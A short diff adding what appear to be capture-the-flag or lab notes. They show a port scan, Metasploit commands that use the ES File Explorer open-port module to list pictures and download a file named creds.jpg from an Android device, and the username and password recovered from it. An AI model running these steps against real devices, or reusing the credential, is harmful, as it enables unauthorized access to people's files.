@@ -1,0 +1,9 @@
+scanned all ports, found es file explorer open
+
+msfconsole - use: scanner/http/es_file_explorer_open_port
+set action LISTPICS
+run
+set action GETFILE
+set actionitem /storage/emulated/0/DCIM/creds.jpg
+run
+user: kristi pass: Kr1sT!5h@Rp3xPl0r3!
